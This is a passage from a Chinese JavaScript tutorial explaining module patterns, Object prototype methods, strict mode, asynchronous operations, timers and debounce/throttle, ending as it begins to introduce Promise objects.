上面代码中，子类S同时继承了父类M1和M2。这种模式又称为 Mixin（混入）。 模块随着网站逐渐变成“互联网应用程序”，嵌入网页的 JavaScript 代码越来越庞大，越来越复杂。网页越来越像桌面程序，需要一个团队分工协作、进度管理、单元测试等等……开发者必须使用软件工程的方法，管理网页的业务逻辑。 JavaScript 模块化编程，已经成为一个迫切的需求。理想情况下，开发者只需要实现核心的业务逻辑，其他都可以加载别人已经写好的模块。 但是，JavaScript 不是一种模块化编程语言，ES6 才开始支持“类”和“模块”。下面介绍传统的做法，如何利用对象实现模块的效果。 基本的实现方法模块是实现特定功能的一组属性和方法的封装。 简单的做法是把模块写成一个对象，所有的模块成员都放到这个对象里面。12345678910111213var module1 = new Object(&#123; _count : 0, m1 : function ()&#123; //... &#125;, m2 : function ()&#123; //... &#125;&#125;);// 上面的函数m1和m2，都封装在module1对象里。使用的时候，就是调用这个对象的属性。module1.m1();// 但是，这样的写法会暴露所有模块成员，内部状态可以被外部改写。比如，外部代码可以直接改变内部计数器的值。module1._count = 5; 封装私有变量：构造函数的写法我们可以利用构造函数，封装私有变量。 12345678910111213141516171819202122232425function StringBuilder() &#123; var buffer = []; this.add = function (str) &#123; buffer.push(str); &#125;; this.toString = function () &#123; return buffer.join(''); &#125;;&#125;// 上面代码中，buffer是模块的私有变量。一旦生成实例对象，外部是无法直接访问buffer的。但是，这种方法将私有变量封装在构造函数中，导致构造函数与实例对象是一体的，总是存在于内存之中，无法在使用完成后清除。这意味着，构造函数有双重作用，既用来塑造实例对象，又用来保存实例对象的数据，违背了构造函数与实例对象在数据上相分离的原则，即实例对象的数据，不应该保存在实例对象以外。同时，非常耗费内存。function StringBuilder() &#123; this._buffer = [];&#125;StringBuilder.prototype = &#123; constructor: StringBuilder, add: function (str) &#123; this._buffer.push(str); &#125;, toString: function () &#123; return this._buffer.join(''); &#125;&#125;;// 这种方法将私有变量放入实例对象中，好处是看上去更自然，但是它的私有变量可以从外部读写，不是很安全。 封装私有变量：立即执行函数的写法使用“立即执行函数”（Immediately-Invoked Function Expression，IIFE），将相关的属性和方法封装在一个函数作用域里面，可以达到不暴露私有成员的目的。 123456789101112131415// 使用下面的写法，外部代码无法读取内部的_count变量。var module1 = (function () &#123; var _count = 0; var m1 = function () &#123; //... &#125;; var m2 = function () &#123; //... &#125;; return &#123; m1 : m1, m2 : m2 &#125;;&#125;)();// 上面的module1就是 JavaScript 模块的基本写法。下面，再对这种写法进行加工。 模块的放大模式如果一个模块很大，必须分成几个部分，或者一个模块需要继承另一个模块，这时就有必要采用“放大模式”（augmentation）。 123456789101112131415// 下面的代码为module1模块添加了一个新方法m3()，然后返回新的module1模块。var module1 = (function (mod)&#123; mod.m3 = function () &#123; //... &#125;; return mod;&#125;)(module1);// 在浏览器环境中，模块的各个部分通常都是从网上获取的，有时无法知道哪个部分会先加载。如果采用上面的写法，第一个执行的部分有可能加载一个不存在空对象，这时就要采用"宽放大模式"（Loose augmentation）。var module1 = (function (mod) &#123; mod.m3 = function () &#123; //... &#125;; return mod;&#125;)(window.module1 || &#123;&#125;);// 与"放大模式"相比，“宽放大模式”就是“立即执行函数”的参数可以是空对象。 输入全局变量独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互。 1234567891011121314151617181920212223// 为了在模块内部调用全局变量，必须显式地将其他变量输入模块。var module1 = (function ($, YAHOO) &#123; //...&#125;)(jQuery, YAHOO);// 上面的module1模块需要使用jQuery库和 YUI 库，就把这两个库（其实是两个模块）当作参数输入module1。这样保证了模块的独立性，还使得模块之间的依赖关系变得明显。// 立即执行函数还可以起到命名空间的作用。(function($, window, document) &#123; function go(num) &#123; &#125; function handleEvents() &#123; &#125; function initialize() &#123; &#125; function dieCarouselDie() &#123; &#125; //attach to the global scope window.finalCarousel = &#123; init : initialize, destroy : dieCarouselDie &#125;&#125;)( jQuery, window, document );// 上面代码中，finalCarousel对象输出到全局，对外暴露init和destroy接口，内部方法go、handleEvents、initialize、dieCarouselDie都是外部无法调用的。 Object 对象的相关方法 Object.getPrototypeOf() 返回参数对象的原型。这是获取原型对象的标准方法。 123456789101112// 下面代码中，实例对象f的原型是F.prototype。var F = function () &#123;&#125;;var f = new F();Object.getPrototypeOf(f) === F.prototype // true// 下面是几种特殊对象的原型。// 函数的原型是 Function.prototypefunction f() &#123;&#125;Object.getPrototypeOf(f) === Function.prototype // true// 空对象的原型是 Object.prototypeObject.getPrototypeOf(&#123;&#125;) === Object.prototype // true// Object.prototype 的原型是 nullObject.getPrototypeOf(Object.prototype) === null // true Object.setPrototypeOf() 为参数对象设置原型，返回该参数对象。它接受两个参数，第一个是现有对象，第二个是原型对象。 1234567891011121314151617// 下面代码中，Object.setPrototypeOf方法将对象a的原型，设置为对象b，因此a可以共享b的属性。var a = &#123;&#125;;var b = &#123;x: 1&#125;;Object.setPrototypeOf(a, b);Object.getPrototypeOf(a) === b // truea.x // 1// new命令可以使用Object.setPrototypeOf方法模拟。var F = function () &#123; this.foo = 'bar';&#125;;var f = new F();// 等同于var f = Object.setPrototypeOf(&#123;&#125;, F.prototype);F.call(f);// 上面代码中，new命令新建实例对象，其实可以分成两步。第一步，将一个空对象的原型设为构造函数的prototype属性（上例是F.prototype）；第二步，将构造函数内部的this绑定这个空对象，然后执行构造函数，使得定义在this上面的方法和属性（上例是this.foo），都转移到这个空对象上。 Object.create()生成实例对象的常用方法是，使用new命令让构造函数返回一个实例。但是很多时候，只能拿到一个实例对象，它可能根本不是由构建函数生成的，那么能不能从一个实例对象，生成另一个实例对象呢？ JavaScript 提供了Object.create方法，用来满足这种需求。该方法接受一个对象作为参数，然后以它为原型，返回一个实例对象。该实例完全继承原型对象的属性。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// 原型对象// 下面代码中，Object.create方法以A对象为原型，生成了B对象。B继承了A的所有属性和方法。var A = &#123; print: function () &#123; console.log('hello'); &#125;&#125;;// 实例对象var B = Object.create(A);Object.getPrototypeOf(B) === A // trueB.print() // helloB.print === A.print // true// 实际上，Object.create方法可以用下面的代码代替。if (typeof Object.create !== 'function') &#123; Object.create = function (obj) &#123; function F() &#123;&#125; F.prototype = obj; return new F(); &#125;;&#125;// 上面代码表明，Object.create方法的实质是新建一个空的构造函数F，然后让F.prototype属性指向参数对象obj，最后返回一个F的实例，从而实现让该实例继承obj的属性。// 下面三种方式生成的新对象是等价的。var obj1 = Object.create(&#123;&#125;);var obj2 = Object.create(Object.prototype);var obj3 = new Object();// 如果想要生成一个不继承任何属性（比如没有toString和valueOf方法）的对象，可以将Object.create的参数设为null。var obj = Object.create(null);obj.valueOf() // Uncaught TypeError: obj.valueOf is not a function// 使用Object.create方法的时候，必须提供对象原型，即参数不能为空，或者不是对象，否则会报错。Object.create() // TypeError: Object prototype may only be an Object or nullObject.create(123) // TypeError: Object prototype may only be an Object or null// Object.create方法生成的新对象，动态继承了原型。在原型上添加或修改任何方法，会立刻反映在新对象之上。var obj1 = &#123; p: 1 &#125;;var obj2 = Object.create(obj1);obj1.p = 2;obj2.p // 2// 除了对象的原型，Object.create方法还可以接受第二个参数。该参数是一个属性描述对象，它所描述的对象属性，会添加到实例对象，作为该对象自身的属性。var obj = Object.create(&#123;&#125;, &#123; p1: &#123; value: 123, enumerable: true, configurable: true, writable: true, &#125;&#125;);// 等同于var obj = Object.create(&#123;&#125;);obj.p1 = 123;// Object.create方法生成的对象，继承了它的原型对象的构造函数。function A() &#123;&#125;var a = new A();var b = Object.create(a);b.constructor === A // trueb instanceof A // true// 上面代码中，b对象的原型是a对象，因此继承了a对象的构造函数A。 Object.prototype.isPrototypeOf() 用来判断该对象是否为参数对象的原型。 123456789101112// 下面代码中，o1和o2都是o3的原型。这表明只要实例对象处在参数对象的原型链上，isPrototypeOf方法都返回true。var o1 = &#123;&#125;;var o2 = Object.create(o1);var o3 = Object.create(o2);o2.isPrototypeOf(o3) // trueo1.isPrototypeOf(o3) // true// 由于Object.prototype处于原型链的最顶端，所以对各种实例都返回true，只有直接继承自null的对象除外。Object.prototype.isPrototypeOf([]) // trueObject.prototype.isPrototypeOf(/xyz/) // trueObject.prototype.isPrototypeOf(Object.create(null)) // false Object.prototype.proto 实例对象的proto属性（前后各两个下划线），返回该对象的原型，即构造函数的prototype属性。该属性可读写。 123456789101112131415161718192021222324252627282930313233343536// 下面代码通过__proto__属性，将p对象设为obj对象的原型。var obj = &#123;&#125;;var p = &#123;&#125;;obj.__proto__ = p;Object.getPrototypeOf(obj) === p // true// __proto__属性指向当前对象的原型对象，即构造函数的prototype属性。var obj = new Object();obj.__proto__ === Object.prototype // trueobj.__proto__ === obj.constructor.prototype // true// 上面代码首先新建了一个对象obj，它的__proto__属性，指向构造函数（Object或obj.constructor）的prototype属性。// 根据语言标准，__proto__属性只有浏览器才需要部署，其他环境可以没有这个属性。它前后的两根下划线，表明它本质是一个内部属性，不应该对使用者暴露。因此，应该尽量少用这个属性，而是用Object.getPrototypeOf()和Object.setPrototypeOf()，进行原型对象的读写操作。// 原型链可以用__proto__很直观地表示。var A = &#123; name: '张三'&#125;;var B = &#123; name: '李四'&#125;;var proto = &#123; print: function () &#123; console.log(this.name); &#125;&#125;;A.__proto__ = proto;B.__proto__ = proto;A.print() // 张三B.print() // 李四A.print === B.print // trueA.print === proto.print // trueB.print === proto.print // true// 上面代码中，A对象和B对象的原型都是proto对象，它们都共享proto对象的print方法。也就是说，A和B的print方法，都是在调用proto对象的print方法。 获取原型对象方法的比较 123456789101112131415161718// 获取实例对象obj的原型对象，有三种方法。obj.__proto__obj.constructor.prototypeObject.getPrototypeOf(obj) // 推荐// 前两种都不是很可靠。__proto__属性只有浏览器才需要部署，其他环境可以不部署。而obj.constructor.prototype在手动改变原型对象时，可能会失效。var P = function () &#123;&#125;;var p = new P();var C = function () &#123;&#125;;C.prototype = p;var c = new C();c.constructor.prototype === p // false// 上面代码中，构造函数C的原型对象被改成了p，但是实例对象的c.constructor.prototype却没有指向p。所以，在改变原型对象时，一般要同时设置constructor属性。C.prototype = p;C.prototype.constructor = C;var c = new C();c.constructor.prototype === p // true Object.getOwnPropertyNames() 返回一个数组，成员是参数对象本身的所有属性(含不可遍历)的键名，不包含继承的属性键名。 12Object.getOwnPropertyNames(Date) // ["length", "name", "prototype", "now", "parse", "UTC"]Object.keys(Date) // [] 只获取那些可以遍历的属性 这表明，Date对象所有自身的属性，都是不可以遍历的 Object.prototype.hasOwnProperty() 对象实例的hasOwnProperty方法返回一个布尔值，用于判断某个属性定义在对象自身，还是定义在原型链上。 1234// hasOwnProperty方法是 JavaScript 之中唯一一个处理对象属性时，不会遍历原型链的方法。Date.hasOwnProperty('length') // trueDate.hasOwnProperty('toString') // false// 上面代码表明，Date.length（构造函数Date可以接受的参数个数）是Date自身的属性，Date.toString是继承的属性。 in 运算符 返回一个布尔值，表示一个对象是否具有某个属性。它不区分该属性是对象自身的属性，还是继承的属性。 123// in运算符常用于检查一个属性是否存在。'length' in Date // true'toString' in Date // true for…in 循环获得对象的所有可遍历属性（不管是自身的还是继承的），可以使用for…in循环。 123456789101112131415161718192021222324252627282930// 下面代码中，对象o2的p2属性是自身的，p1属性是继承的。这两个属性都会被for...in循环遍历。var o1 = &#123; p1: 123 &#125;;var o2 = Object.create(o1, &#123; p2: &#123; value: "abc", enumerable: true &#125;&#125;);for (p in o2) &#123; console.info(p); // p2 p1&#125;// 为了在for...in循环中获得对象自身的属性，可以采用hasOwnProperty方法判断一下。for ( var name in object ) &#123; if ( object.hasOwnProperty(name) ) &#123; // ... &#125;&#125;// 获得对象的所有属性（包括自身和继承的，可枚举和不可枚举）。function inheritedPropertyNames(obj) &#123; var props = &#123;&#125;; while(obj) &#123; Object.getOwnPropertyNames(obj).forEach(function(p) &#123; props[p] = true; &#125;); obj = Object.getPrototypeOf(obj); &#125; return Object.getOwnPropertyNames(props);&#125;// 上面代码依次获取obj对象的每一级原型对象“自身”的属性，从而获取obj对象的“所有”属性，不管是否可遍历。inheritedPropertyNames(Date) // ["length", "name", "prototype", "now", "parse", "UTC", "arguments", "caller", ...] 对象的拷贝如果要拷贝一个对象，需要确保拷贝后的对象，与原对象具有同样的原型，且与原对象具有同样的实例属性。 12345678910111213141516171819202122232425// 对象拷贝函数function copyObject(orig) &#123; var copy = Object.create(Object.getPrototypeOf(orig)); copyOwnPropertiesFrom(copy, orig); return copy;&#125;function copyOwnPropertiesFrom(target, source) &#123; Object .getOwnPropertyNames(source) .forEach(function (propKey) &#123; var desc = Object.getOwnPropertyDescriptor(source, propKey); Object.defineProperty(target, propKey, desc); &#125;); return target;&#125;// 另一种更简单的写法，是利用 ES2017 才引入标准的Object.getOwnPropertyDescriptors方法。function copyObject(orig) &#123; return Object.create( Object.getPrototypeOf(orig), Object.getOwnPropertyDescriptors(orig) );&#125; 严格模式正常的运行模式外，JavaScript 还有第二种运行模式：严格模式（strict mode），这种模式采用更加严格的 JavaScript 语法。 设计目的早期的 JS 语言有很多设计不合理的地方，但是为了兼容以前的代码，又不能改变老的语法，只能不断添加新的语法。严格模式是从 ES5 进入标准的，主要目的有以下几个。明确禁止一些不合理、不严谨的语法，减少 JavaScript 语言的一些怪异行为。增加更多报错的场合，消除代码运行的一些不安全之处，保证代码运行的安全。提高编译器效率，增加运行速度。为未来新版本的 JavaScript 语法做好铺垫。总之，严格模式体现了 JavaScript 更合理、更安全、更严谨的发展方向。 启用方法进入严格模式的标志，是一行字符串。老版本的引擎会把它当作一行普通字符串，加以忽略。新版本的引擎就会进入严格模式。‘use strict’; 严格模式可以用于整个脚本(放在脚本文件的第一行，严格地说，只要前面不是产生实际运行结果的语句，可以不在第一行，比如直接跟在一个空的分号后面，或者跟在注释后面)，也可以只用于单个函数(放在函数体的第一行)。 有时，需要把不同的脚本合并在一个文件里面。如果一个脚本是严格模式，另一个脚本不是，它们的合并就可能出错。严格模式的脚本在前，则合并后的脚本都是严格模式；如果正常模式的脚本在前，则合并后的脚本都是正常模式。这两种情况下，合并后的结果都是不正确的。这时可以考虑把整个脚本文件放在一个立即执行的匿名函数之中。 显式报错12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 只读属性不可写// 严格模式下，设置字符串的length属性，会报错。因为length是只读属性，严格模式下不可写。正常模式下，改变length属性是无效的，但不会报错。'use strict';'abc'.length = 5; // Uncaught TypeError: Cannot assign to read only property 'length' of string 'abc'// 严格模式下，对只读属性赋值，或者删除不可配置（non-configurable）属性都会报错。'use strict';var obj = Object.defineProperty(&#123;&#125;, 'a', &#123; value: 37, writable: false, configurable: false&#125;);obj.a = 123; // Uncaught TypeError: Cannot add property a, object is not extensibledelete obj.a // Uncaught TypeError: Cannot delete property 'a' of #&lt;Object&gt;// 只设置了取值器的属性不可写// 严格模式下，对一个只有取值器（getter）、没有存值器（setter）的属性赋值，会报错。'use strict';var obj = &#123; get v() &#123; return 1; &#125;&#125;;obj.v = 2; // Uncaught TypeError: Cannot set property v of #&lt;Object&gt; which has only a getter// 禁止扩展的对象不可扩展// 严格模式下，对禁止扩展的对象添加新属性，会报错。'use strict';var obj = &#123;&#125;;Object.preventExtensions(obj);obj.v = 1; // // Uncaught TypeError: Cannot add property v, object is not extensible// eval、arguments 不可用作标识名'use strict';var eval = 17;function arguments() &#123; &#125; // Uncaught SyntaxError: Unexpected eval or arguments in strict mode// 函数不能有重名的参数// 正常模式下，如果函数有多个重名的参数，可以用arguments[i]读取。严格模式下，这属于语法错误。function f(a, a, b) &#123; 'use strict'; return a + b;&#125;// Uncaught SyntaxError: Duplicate parameter name not allowed in this context// 禁止八进制的前缀0表示法// 正常模式下，整数的第一位如果是0，表示这是八进制数，比如0100等于十进制的64。严格模式禁止这种表示法，整数第一位为0，将报错。'use strict';var n = 0100; // Uncaught SyntaxError: Octal literals are not allowed in strict mode. 增强的安全措施严格模式增强了安全保护，从语法上防止了一些不小心会出现的错误。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// 全局变量显式声明// 正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式下，变量都必须先声明，然后再使用。'use strict';v = 1; // Uncaught ReferenceError: v is not defined// 禁止 this 关键字指向全局对象// 正常模式下，函数内部的this可能会指向全局对象，严格模式禁止这种用法，避免无意间创造全局变量。// 严格模式function f() &#123; 'use strict'; console.log(this === undefined); // 严格模式的函数体内部this是undefined&#125;f() // true // 这种限制对于构造函数尤其有用。使用构造函数时，有时忘了加new，这时this不再指向全局对象，而是报错。function f() &#123; 'use strict'; this.a = 1;&#125;;f();// 报错，this 未定义// 严格模式下，函数直接调用时（不使用new调用），函数内部的this表示undefined（未定义），因此可以用call、apply和bind方法，将任意值绑定在this上面。正常模式下，this指向全局对象，如果绑定的值是非对象，将被自动转为对象再绑定上去，而null和undefined这两个无法转成对象的值，将被忽略。// 正常模式function fun() &#123; return this;&#125;fun() // windowfun.call(2) // Number &#123;2&#125;fun.call(true) // Boolean &#123;true&#125;fun.call(null) // windowfun.call(undefined) // window// 严格模式'use strict';function fun() &#123; return this;&#125;fun() //undefinedfun.call(2) // 2fun.call(true) // truefun.call(null) // nullfun.call(undefined) // undefined// 禁止使用 fn.callee、fn.caller// 禁止使用 arguments.callee、arguments.caller// 禁止删除变量// 严格模式下无法删除变量，如果使用delete命令删除一个变量，会报错。只有对象的属性，且属性的描述对象的configurable属性设置为true，才能被delete命令删除。'use strict';var x;delete x; // 语法错误var obj = Object.create(null, &#123; x: &#123; value: 1, configurable: true &#125;&#125;);delete obj.x; // 删除成功 静态绑定JavaScript 语言的一个特点，就是允许“动态绑定”，即某些属性和方法到底属于哪一个对象，不是在编译时确定的，而是在运行时（runtime）确定的。 严格模式对动态绑定做了一些限制。某些情况下，只允许静态绑定。也就是说，属性和方法到底归属哪个对象，必须在编译阶段就确定。这样做有利于编译效率的提高，也使得代码更容易阅读，更少出现意外。 具体来说，涉及以下几个方面: 禁止使用 with 语句 创设 eval 作用域。正常模式下，eval语句的作用域，取决于它处于全局作用域，还是函数作用域。严格模式下，eval语句本身就是一个作用域，不再能够在其所运行的作用域创设新的变量了，也就是说，eval所生成的变量只能用于eval内部。 arguments 不再追踪参数的变化。 异步操作异步操作概述单线程模型JavaScript 只在一个线程上运行。也就是说，JavaScript 同时只能执行一个任务，其他任务都必须在后面排队等待。但不代表 JavaScript 引擎只有一个线程。事实上，JavaScript 引擎有多个线程，单个脚本只能在一个线程上运行（称为主线程），其他线程都是在后台配合。 原因是不想让浏览器变得太复杂，因为多线程需要共享资源、且有可能修改彼此的运行结果，所以，为了避免复杂性，JavaScript 一开始就是单线程，这已经成了这门语言的核心特征，将来也不会改变。 这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。 JavaScript 语言的设计者意识到，CPU 完全可以不管 IO 操作，挂起处于等待中的任务，先运行排在后面的任务。等到 IO 操作返回了结果，再回过头，把挂起的任务继续执行下去。这种机制就是 JavaScript 内部采用的“事件循环”机制（Event Loop）。 同步任务和异步任务程序里面所有的任务，可以分成两类：同步任务（synchronous）和异步任务（asynchronous）。 同步任务是那些没有被引擎挂起、在主线程上排队执行的任务。只有前一个任务执行完毕，才能执行后一个任务。 异步任务是那些被引擎放在一边，不进入主线程、而进入任务队列的任务。只有引擎认为某个异步任务可以执行了（比如 Ajax 操作从服务器得到了结果），该任务（采用回调函数的形式）才会进入主线程执行。排在异步任务后面的代码，不用等待异步任务结束会马上运行，也就是说，异步任务不具有“堵塞”效应。 任务队列和事件循环JavaScript 运行时，除了一个正在运行的主线程，引擎还提供一个任务队列（task queue），里面是各种需要当前程序处理的异步任务。（实际上，根据异步任务的类型，存在多个任务队列。为了方便理解，这里假设只存在一个队列。） 首先，主线程会去执行所有的同步任务。等到同步任务全部执行完，就会去看任务队列里面的异步任务。如果满足条件，那么异步任务就重新进入主线程开始执行，这时它就变成同步任务了。等到执行完，下一个异步任务再进入主线程开始执行。一旦任务队列清空，程序就结束执行。 异步任务的写法通常是回调函数。一旦异步任务重新进入主线程，就会执行对应的回调函数。如果一个异步任务没有回调函数，就不会进入任务队列，也就是说，不会重新进入主线程，因为没有用回调函数指定下一步的操作。 JavaScript 引擎怎么知道异步任务有没有结果，能不能进入主线程呢？答案就是引擎在不停地检查，一遍又一遍，只要同步任务执行完了，引擎就会去检查那些挂起来的异步任务，是不是可以进入主线程了。这种循环检查的机制，就叫做事件循环（Event Loop）。事件循环是一个程序结构，用于等待和发送消息和事件。 异步操作的模式 回调函数回调函数是异步操作最基本的方法。回调函数的优点是简单、容易理解和实现，缺点是不利于代码的阅读和维护，各个部分之间高度耦合（coupling），使得程序结构混乱、流程难以追踪（尤其是多个回调函数嵌套的情况），而且每个任务只能指定一个回调函数。 1234567891011121314151617181920// 下面是两个函数f1和f2，编程的意图是f2必须等到f1执行完成，才能执行。function f1() &#123; // ...&#125;function f2() &#123; // ...&#125;f1();f2();// 上面代码的问题在于，如果f1是异步操作，f2会立即执行，不会等到f1结束再执行。// 这时，可以考虑改写f1，把f2写成f1的回调函数。function f1(callback) &#123; // ... callback();&#125;function f2() &#123; // ...&#125;f1(f2); 事件监听异步任务的执行不取决于代码的顺序，而取决于某个事件是否发生。这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以“去耦合”（decoupling），有利于实现模块化。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。阅读代码的时候，很难看出主流程。 12345678910// 还是以f1和f2为例。首先，为f1绑定一个事件（这里采用的 jQuery 的写法）。f1.on('done', f2);// 上面这行代码的意思是，当f1发生done事件，就执行f2。然后，对f1进行改写：function f1() &#123; setTimeout(function () &#123; // ... f1.trigger('done'); &#125;, 1000);&#125;// 上面代码中，f1.trigger('done')表示，执行完成后，立即触发done事件，从而开始执行f2。 发布/订阅事件完全可以理解成“信号”，如果存在一个“信号中心”，某个任务执行完成，就向信号中心“发布”（publish）一个信号，其他任务可以向信号中心“订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”发布/订阅模式”（publish-subscribe pattern），又称“观察者模式”（observer pattern）。 123456789101112// 首先，f2向信号中心jQuery订阅done信号。jQuery.subscribe('done', f2);// 然后，f1进行如下改写。function f1() &#123; setTimeout(function () &#123; // ... jQuery.publish('done'); &#125;, 1000);&#125;// 上面代码中，jQuery.publish('done')的意思是，f1执行完成后，向信号中心jQuery发布done信号，从而引发f2的执行。// f2完成执行后，可以取消订阅（unsubscribe）。jQuery.unsubscribe('done', f2); 这种方法的性质与“事件监听”类似，但是明显优于后者。因为可以通过查看“消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。 异步操作的流程控制如果有多个异步操作，就存在一个流程控制的问题：如何确定异步操作执行的顺序，以及如何保证遵守这种顺序。 串行执行我们可以编写一个流程控制函数，让它来控制异步任务，一个任务完成以后，再执行另一个。这就叫串行执行。 1234567891011121314151617181920212223242526// 下面代码中，函数series就是串行函数，它会依次执行异步任务，所有任务都完成后，才会执行final函数。items数组保存每一个异步任务的参数，results数组保存每一个异步任务的运行结果。var items = [ 1, 2, 3, 4, 5, 6 ];var results = [];function async(arg, callback) &#123; console.log('参数为 ' + arg +' , 1秒后返回结果'); setTimeout(function () &#123; callback(arg * 2); &#125;, 1000);&#125;function final(value) &#123; console.log('完成: ', value);&#125;function series(item) &#123; if(item) &#123; async( item, function(result) &#123; results.push(result); return series(items.shift()); &#125;); &#125; else &#123; return final(results[results.length - 1]); &#125;&#125;series(items.shift());// 上面的写法需要六秒，才能完成整个脚本。 并行执行流程控制函数也可以是并行执行，即所有异步任务同时执行，等到全部完成以后，才执行final函数。 12345678910111213141516171819202122// 下面代码中，forEach方法会同时发起六个异步任务，等到它们全部完成以后，才会执行final函数。var items = [ 1, 2, 3, 4, 5, 6 ];var results = [];function async(arg, callback) &#123; console.log('参数为 ' + arg +' , 1秒后返回结果'); setTimeout(function () &#123; callback(arg * 2); &#125;, 1000);&#125;function final(value) &#123; console.log('完成: ', value);&#125;items.forEach(function(item) &#123; async(item, function(result)&#123; results.push(result); if(results.length === items.length) &#123; final(results[results.length - 1]); &#125; &#125;)&#125;);// 相比而言，上面的写法只要一秒，就能完成整个脚本。这就是说，并行执行的效率较高，比起串行执行一次只能执行一个任务，较为节约时间。但是问题在于如果并行的任务较多，很容易耗尽系统资源，拖慢运行速度。因此有了第三种流程控制方式。 并行与串行的结合所谓并行与串行的结合，就是设置一个门槛，每次最多只能并行执行n个异步任务，这样就避免了过分占用系统资源。 123456789101112131415161718192021222324252627282930313233// 下面代码中，最多只能同时运行两个异步任务。变量running记录当前正在运行的任务数，只要低于门槛值，就再启动一个新的任务，如果等于0，就表示所有任务都执行完了，这时就执行final函数。var items = [ 1, 2, 3, 4, 5, 6 ];var results = [];var running = 0;var limit = 2;function async(arg, callback) &#123; console.log('参数为 ' + arg +' , 1秒后返回结果'); setTimeout(function () &#123; callback(arg * 2); &#125;, 1000);&#125;function final(value) &#123; console.log('完成: ', value);&#125;function launcher() &#123; while(running &lt; limit &amp;&amp; items.length &gt; 0) &#123; var item = items.shift(); async(item, function(result) &#123; results.push(result); running--; if(items.length &gt; 0) &#123; launcher(); &#125; else if(running == 0) &#123; final(results); &#125; &#125;); running++; &#125;&#125;launcher();// 这段代码需要三秒完成整个脚本，处在串行执行和并行执行之间。通过调节limit变量，达到效率和资源的最佳平衡。 定时器JavaScript 提供定时执行代码的功能，叫做定时器（timer），主要由setTimeout()和setInterval()这两个函数来完成。它们向任务队列添加定时任务。 setTimeout()setTimeout函数用来指定某个函数或某段代码，在多少毫秒之后执行。它返回一个整数，表示定时器的编号，以后可以用来取消这个定时器。var timerId = setTimeout(func, delay); 第二个参数如果省略，则默认为0。还允许更多的参数。它们将依次传入推迟执行的函数（回调函数） 注意，如果回调函数是对象的方法，那么setTimeout使得方法内部的this关键字指向全局环境，而不是定义时所在的那个对象。1234567891011121314// 下面代码输出的是1，而不是2。因为当obj.y在1000毫秒后运行时，this所指向的已经不是obj了，而是全局环境。var x = 1;var obj = &#123; x: 2, y: function () &#123; console.log(this.x); &#125;&#125;;setTimeout(obj.y, 1000) // 1// 为了防止出现这个问题，一种解决方法是将obj.y放入一个函数中。这使得obj.y在obj的作用域执行，而不是在全局作用域内执行，所以能够显示正确的值。setTimeout(function () &#123; obj.y(); &#125;, 1000); // 2// 另一种解决方法是，使用bind方法，将obj.y这个方法绑定在obj上面。setTimeout(obj.y.bind(obj), 1000) setInterval()setInterval函数的用法与setTimeout完全一致，区别仅仅在于setInterval指定某个任务每隔一段时间就执行一次，也就是无限次的定时执行。 setInterval指定的是“开始执行”之间的间隔，并不考虑每次任务执行本身所消耗的时间。因此实际上，两次执行之间的间隔会小于指定的时间。比如，setInterval指定每 100ms 执行一次，每次执行需要 5ms，那么第一次执行结束后95毫秒，第二次执行就会开始。如果某次执行耗时特别长，比如需要105毫秒，那么它结束后，下一次执行就会立即开始。 为了确保两次执行之间有固定的间隔，可以不用setInterval，而是每次执行结束后，使用setTimeout指定下一次执行的具体时间。123456// 下面代码可以确保，下一次执行总是在本次执行结束之后的2000毫秒开始。var i = 1;var timer = setTimeout(function f() &#123; // ... timer = setTimeout(f, 2000);&#125;, 2000); clearTimeout()，clearInterval()setTimeout和setInterval函数，都返回一个整数值，表示计数器编号。将该整数传入clearTimeout和clearInterval函数，就可以取消对应的定时器。 1234567891011121314151617181920// 下面代码中，回调函数f不会再执行了，因为定时器被取消了。var id1 = setTimeout(f, 1000);clearTimeout(id1);// 消当前所有的setTimeout定时器。(function() &#123; // 每轮事件循环检查一次 var gid = setInterval(clearAllTimeouts, 0); function clearAllTimeouts() &#123; var id = setTimeout(function() &#123;&#125;, 0); while (id &gt; 0) &#123; if (id !== gid) &#123; clearTimeout(id); &#125; id--; &#125; &#125;&#125;)();// 上面代码中，先调用setTimeout，得到一个计算器编号，然后把编号比它小的计数器全部取消。 debounce 防抖 要连续操作结束后再执行 1234567891011121314function debounce(fn, delay)&#123; var timer = null; // 声明计时器 return function() &#123; var context = this; var args = arguments; clearTimeout(timer); timer = setTimeout(function () &#123; fn.apply(context, args); &#125;, delay); &#125;;&#125;$('textarea').on('keydown', debounce(ajaxAction, 2500));// 上面代码中，只要在2500毫秒之内，用户再次击键，就会取消上一次的定时器，然后再新建一个定时器。这样就保证了回调函数之间的调用间隔，至少是2500毫秒。 throttle 节流 确保一段时间内只执行一次 123456789function throttle(fn, wait) &#123; var time = Date.now(); return function() &#123; if ((time + wait - Date.now()) &lt; 0) &#123; fn(); time = Date.now(); &#125; &#125;&#125; 运行机制setTimeout和setInterval的运行机制，是将指定的代码移出本轮事件循环，等到下一轮事件循环，再检查是否到了指定时间。如果到了，就执行对应的代码；否则，就继续等待。 setTimeout(f, 0)等到当前脚本的同步任务，全部处理完以后，才会执行setTimeout指定的回调函数f。也就是说，setTimeout(f, 0)会在下一轮事件循环一开始就执行。尽可能早地执行f，但是并不能保证立刻就执行f。 实际上，setTimeout(f, 0)不会真的在0毫秒之后运行，不同的浏览器有不同的实现。以 Edge 浏览器为例，会等到4毫秒之后运行。如果电脑正在使用电池供电，会等到16毫秒之后运行；如果网页不在当前 Tab 页，会推迟到1000毫秒（1秒）之后运行。这样是为了节省系统资源。 Promise 对象Promise 对象是 JavaScript 的异步操作解决方案，为异步操作提供统一接口。它起到代理作用（proxy），充当异步操作与回调函数之间的中介，使得异步操作具备同步操作的接口，让异步操作写起来，就像在写同步操作的流程，而不必一层层地嵌套回调函数，让回调函数变成了规范的链式写法，程序流程可以看得很清楚。 Promise 还有一个传统写法没有的好处：它的状态一旦改变，无论何时查询，都能得到这个状态。这意味着，无论何时为 Promise 